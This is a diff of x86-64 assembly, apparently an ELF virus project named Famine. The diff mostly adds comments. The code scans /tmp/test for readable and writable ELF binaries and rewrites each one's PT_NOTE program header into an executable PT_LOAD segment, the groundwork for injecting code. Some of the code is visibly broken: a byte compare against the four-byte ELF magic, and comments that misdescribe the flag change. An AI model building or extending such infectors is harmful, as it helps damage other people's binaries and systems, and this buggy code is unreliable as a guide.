@@ -22,58 +22,62 @@
 %define PT_LOAD 1
 
 %define PF_X 1
-%define PF_W 2 
-%define PF_R 4 
-; r15 /tmp/test
-; r15 + 16 /tmp/test fd
-; r15 + 32 struct stat
+%define PF_W 2
+%define PF_R 4
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;             BUFFER           ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+; r15 /tmp/test                                     directory /tmp/test name
+; r15 + 16 /tmp/test                                directory /tmp/test fd
+
+; r15 + 32 struct stat                              
 ;	r15 + 32 dev inode_number
-;	r15 + 32 + 24 stat.st_mode
+;	r15 + 56 stat.st_mode
 ; 	r15 + 80 stat.st_size
 
 ; r15 + 176 struct dirent (sizeof dirent 280)
-; 	r15 + 176 d_ino
-; 	r15 + 176 + 8 d_off
-; 	r15 + 176 + 16 rec_len
-; 	r15 + 176 + 18 d_type
-; 	r15 + 176 + 19 d_name
+;	r15 + 176    d_ino       	                    64-bit Inode number.
+;	r15 + 184    d_off       	                    64-bit Offset to the next dirent structure.
+;	r15 + 192    d_reclen    	                    16-bit Length of this record.
+;	r15 + 194    d_type      	                    8-bit File type (DT_REG, DT_DIR, etc.).
+;	r15 + 195    d_name      	                    Null-terminated filename.
 
 ; r15 + 1300 Ehdr64
 ; 	🦓 r15 + 1300 = ehdr
-; 	🐴 r15 + 1304 = ehdr.class
-; 	🦄 r15 + 1308 = ehdr.pad
-; 	🦓 r15 + 1324 = ehdr.entry
-; 	🐴 r15 + 1332 = ehdr.phoff
-; 	🦄 r15 + 1354 = ehdr.phentsize
-; 	🦓 r15 + 1356 = ehdr.phnum
-; 	🐴 r15 + 1364 = phdr.type
-; 	🦄 r15 + 1368 = phdr.flags
-; 	🦓 r15 + 1372 = phdr.offset
-; 	🐴 r15 + 1380 = phdr.vaddr
-; 	🦄 r15 + 1388 = phdr.paddr
-; 	🦓 r15 + 1396 = phdr.filesz
-; 	🐴 r15 + 1404 = phdr.memsz
-; 	🦄 r15 + 1412 = phdr.align
+; 	🐴 r15 + 1304 = ehdr.class                      ELF class.
+; 	🦄 r15 + 1308 = ehdr.pad                        Unused padding for alignment.
+; 	🦓 r15 + 1324 = ehdr.entry                      Entry point virtual address.
+; 	🐴 r15 + 1332 = ehdr.phoff                      Offset of the program header table.
+; 	🦄 r15 + 1354 = ehdr.phentsize                  Size of each program header entry.
+; 	🦓 r15 + 1356 = ehdr.phnum                      Number of program header entries.
+; 	🐴 r15 + 1364 = phdr.type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
+; 	🦄 r15 + 1368 = phdr.flags                      Segment flags (e.g., PF_X, PF_W, PF_R).
+; 	🦓 r15 + 1372 = phdr.offset                     Offset of the segment in the file.
+; 	🐴 r15 + 1380 = phdr.vaddr                      Virtual address of the segment in memory.
+; 	🦄 r15 + 1388 = phdr.paddr                      Physical address of the segment (not used on most systems).
+; 	🦓 r15 + 1396 = phdr.filesz                     Size of the segment in the file.
+; 	🐴 r15 + 1404 = phdr.memsz                      Size of the segment in memory (may include padding).
+; 	🦄 r15 + 1412 = phdr.align                      Alignment of the segment in memory and file
 
-; r15 + 1420 binary_fd
+; r15 + 1420 binary_fd                              Actual reading file descriptor
+
 ; r15 + 1424 Phdr64
-;		r15 + 1424	p_type;		
-; 		r15 + 1428	p_flags;	
-; 		r15 + 1432	p_offset;		
-; 		r15 + 1440	p_vaddr;	
-; 		r15 + 1448	p_paddr;	
-; 		r15 + 1456	p_filesz;	
-; 		r15 + 1464	p_memsz;	
-; 		r15 + 1472	p_align;	
-; r15 + 1420 binary_fd
+;	r15 + 1424    phdr.p_type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
+;	r15 + 1428    phdr.p_flags                      Segment flags (e.g., PF_X, PF_W, PF_R).
+;	r15 + 1432    phdr.p_offset                     Offset of the segment in the file.
+;	r15 + 1440    phdr.p_vaddr                      Virtual address of the segment in memory.
+;	r15 + 1448    phdr.p_paddr                      Physical address of the segment (not used on most systems).
+;	r15 + 1456    phdr.p_filesz                     Size of the segment in the file.
+;	r15 + 1464    phdr.p_memsz                      Size of the segment in memory (may include padding).
+;	r15 + 1472    phdr.p_align                      Alignment of the segment in memory and file.
 
-; r15 + 1484 	phdr_num counter
-; r15 + 1488	pt_load value buffer address
-; r15 + 1492	program original entry point
+; r15 + 1484                                        phdr_num counter to iterate over the headers
 
 global _start
 
-	section .text
+section .text
 _start:
 	S_IRUSR equ 256 ; Owner has read permission
 	S_IWUSR equ 128 ; Owner has write permission
@@ -81,31 +85,32 @@ _start:
 	push rbp
 	push rdx
 	push rsp
-	sub  rsp, FAMINE_STACK_SIZE
+	sub  rsp, FAMINE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
 	mov r15, rsp    
+
+_folder_to_infect:	
 	mov qword [r15], '/tmp'
 	mov qword [r15 + 4], '/tes'
-	mov qword [r15 + 8], 0x00000074
+	mov qword [r15 + 8], 0x00000074                ; assigning /tmp/test to the beginning of the r15 register
 
-	mov rdi, r15
+	mov rdi, r15                                   ; ?????????????
 	mov [r15 + 16], rax
-	test rax,rax
-	js _end		; if open fails, exit silently
+	test rax, rax
+	js _end                                        ; if open fails, exit silently ??
 
+_folder_stat:
 	mov rdi, r15
 	lea rsi, [r15 + 32]
 	mov rax, SYS_STAT
 	syscall
 
 _is_dir:
-	lea rax, [r15 + 32 + 24]
+	lea rax, [r15 + 56]
 	mov rcx, [rax]
 	mov rdx, S_IFDIR
-
 	and rcx, S_IFMT
-
 	cmp rdx, rcx
-	jne _end ; if failure, exit
+	jne _end
 
 _diropen:
 	mov rdi, r15
@@ -113,136 +118,118 @@ _diropen:
 	mov rax, SYS_OPEN
 	syscall
 
-	test rax, rax
-	js _end  ; end if open fails
+	test rax, rax                                 ; checking open
+	js _end
 
-	mov [r15 + 16], rax ; saving  /tmp/test open fd for later
+	mov [r15 + 16], rax                           ; saving /tmp/test open fd
 
-_change_to_dir:
+_change_to_dir:                                   ; cd to dir
 	lea rdi, [r15]
 	mov rax, SYS_CHDIR
 	syscall
 
-_dirent_tmp_test:
+_dirent_tmp_test:                                 ; getdents the directory to iterate over all the binaries
 	mov rdi, [r15 + 16]
 	lea rsi, [r15 + 176]
 	mov rdx, DIRENT_BUFFSIZE
 	mov rax, SYS_GETDENTS64
 	syscall
 
-	cmp rax, 0
+	cmp rax, 0                                    ; no more files in the directory to read
 	je _close_folder
 
-	xor r14, r14
-	mov r13, rax
+	xor r14, r14                                  ; i = 0 for the first iteration
+	mov r13, rax                                  ; r13 stores the number of read bytes with getdents
 _dirent_loop:
-	movzx r12d, word [r15 + 176 + 16 + r14]
-
-	; mov rax, SYS_WRITE
-	; mov rdi, 1
-	; lea rsi, [r15 + 176 + 19 + r14] ; dirent->name
-	; mov rdx, 4
-	; syscall
-
-	; mov rax, SYS_WRITE
-	; mov rdi, 1
-	; mov word [r15 + 4000], 10
-	; lea rsi, [r15 + 4000]
-	; mov rdx, 1
-	; syscall
+	movzx r12d, word [r15 + 192 + r14]
 
 _stat_file:
-	lea rdi, [r15 + 176 + 19 + r14]
+	lea rdi, [r15 + 195 + r14]                    ; stat over every file
 	lea rsi, [r15 + 32]
 	mov rax, SYS_STAT
 	syscall
 
-_check_file_flags:
-	lea rax, [r15 + 32 + 24]
-	mov rcx, [rax] ;;; rcx & S_IRUSR === 1   
-	and rcx, S_IRUSR
-	test rcx, rcx
-	jz _continue_dirent
-
-	lea rax, [r15 + 32 + 24]  
+_check_file_flags:                                ; check if if the program can read and write over the binary
+	lea rax, [r15 + 56]
 	mov rcx, [rax]
-	and rcx, S_IWUSR   ;;;; rcx & S_IWUSR == 1
+	and rcx, S_IRUSR                              ; rcx & S_IRUSR == 1
 	test rcx, rcx
 	jz _continue_dirent
 
-	lea rax, [r15 + 32 + 24]
+	lea rax, [r15 + 56]  
+	mov rcx, [rax]
+	and rcx, S_IWUSR                               ; rcx & S_IWUSR == 1
+	test rcx, rcx
+	jz _continue_dirent
+
+	lea rax, [r15 + 56]
 	mov rcx, [rax]
 	mov rdx, S_IFDIR
 	and rcx, S_IFMT
 	cmp rdx, rcx
-	je _continue_dirent ; checks if its a directory
+	je _continue_dirent                           ; checks if its a directory, if so, jump to the next binary of the dirent
 
-	cmp dword [r15 + 80], 64 ; checks that the file is at least as big as an ELF header
+	cmp dword [r15 + 80], 64                      ; checks that the file is at least as big as an ELF header
 	jl _continue_dirent
 
 _open_bin:
-	lea rdi, [r15 + 176 + 19 + r14]
-	mov rsi, 0x0002 ; O_RDWR 
+	lea rdi, [r15 + 195 + r14]
+	mov rsi, 0x0002                               ; O_RDWR 
 	mov rdx, 0644o
-	mov rax, SYS_OPEN ;; open ( dirent->d_name, O_RW)
+	mov rax, SYS_OPEN                             ; open ( dirent->d_name, O_RDWR )
 	syscall
 
-	mov qword [r15 + 1420], rax									 ; save fd
-	mov rdi, rax                                         ; rax contains fd
-	lea rsi, [r15 + 1300]                                ; rsi = ehdr = [r15 + 144]
-	mov rdx, EHDR_SIZE			                                 ; ehdr.size
-	mov r10, 0                                           ; read at offset 0
+	mov qword [r15 + 1420], rax                   ; save binary fd
+	mov rdi, rax                                  ; rax contains fd
+	lea rsi, [r15 + 1300]                         ; rsi = ehdr
+	mov rdx, EHDR_SIZE			                  ; ehdr.size
+	mov r10, 0                                    ; read at offset 0
 	mov rax, SYS_PREAD64
 	syscall
 
 _is_elf:
-	cmp byte [r15 + 1300], 0x464c457f
+	cmp byte [r15 + 1300], 0x464c457f             ; check if the file starts with 177ELF what indicates it is an ELF binary
 	jne _close_bin
 
 _save_entry_dpuente:  ;; very important!!!
 	xor rax, rax
 
-	mov byte [r15 + 1484], 0
+	mov byte [r15 + 1484], 0                      ; i = 0, iterate over all ELF program headers
 _read_phdr:
 	mov word r9w, [r15 + 1484]
 	cmp word [r15 + 1356], r9w
-	je _close_bin
+	je _close_bin                                 ; check if all the headers have been read
 
-	lea rsi, [r15 + 1424]; phdr
+	lea rsi, [r15 + 1424]
 	mov rdx, PHDR_SIZE
 	mov r10, [r15 + 1484]
-	imul r10,r10, PHDR_SIZE
+	imul r10, r10, PHDR_SIZE
 	add r10, EHDR_SIZE
 	mov rax, SYS_PREAD64
 	syscall
 
-	cmp word [r15 + 1424], PT_NOTE ; phdr->type
-	jne _next_phdr
-
-	;; pwrite(fd, buff, size, off)
+	cmp word [r15 + 1424], PT_NOTE                ; phdr->type
+	jne _next_phdr                                ; if it is not a PT_NOTE header, continue to check the next one
 
 _change_ptnote_to_ptload:
-	mov dword [r15 + 1424], PT_LOAD
+	mov dword [r15 + 1424], PT_LOAD               ; change PT_NOTE header to PT_LOAD
 
 _change_mem_protections:
-	mov dword [r15 + 1428], PF_R | PF_X
+	mov dword [r15 + 1428], PF_R | PF_X           ; disable memory protections
 
-_write_header_changes_to_bin:
+_write_header_changes_to_bin:                     ; writes new header modifications to the binary
 	mov rdi, [r15 + 1420]
 	lea rsi, [r15 + 1424]
 	mov rdx, PHDR_SIZE
-	; mov r10, r10
+	; mov r10, r10 ????????
 	mov rax, SYS_PWRITE64
 	syscall
-	
 
 	jmp _close_bin
-
 
 _next_phdr:
 	inc word [r15 + 1484]
 	jmp _read_phdr
-
 
 _close_bin:
 	mov qword rdi,[ r15 + 1420]
@@ -252,20 +239,16 @@ _close_bin:
 _continue_dirent:
 	add r14, r12
 	cmp r14, r13
-	jne _dirent_loop
-
-	jmp _dirent_tmp_test
-
+	jne _dirent_loop                              ; if it has still files to read continues to the next one
+	jmp _dirent_tmp_test                          ; else, do the getdents again
 
 _close_folder:
 	mov rdi, [r15 + 16]
 	mov rax, SYS_CLOSE
 	syscall
-	
 
-	jmp _end
 _end:
-	add  rsp, FAMINE_STACK_SIZE
+	add rsp, FAMINE_STACK_SIZE
 	pop rsp
 	pop rdx
 	mov rax, SYS_EXIT
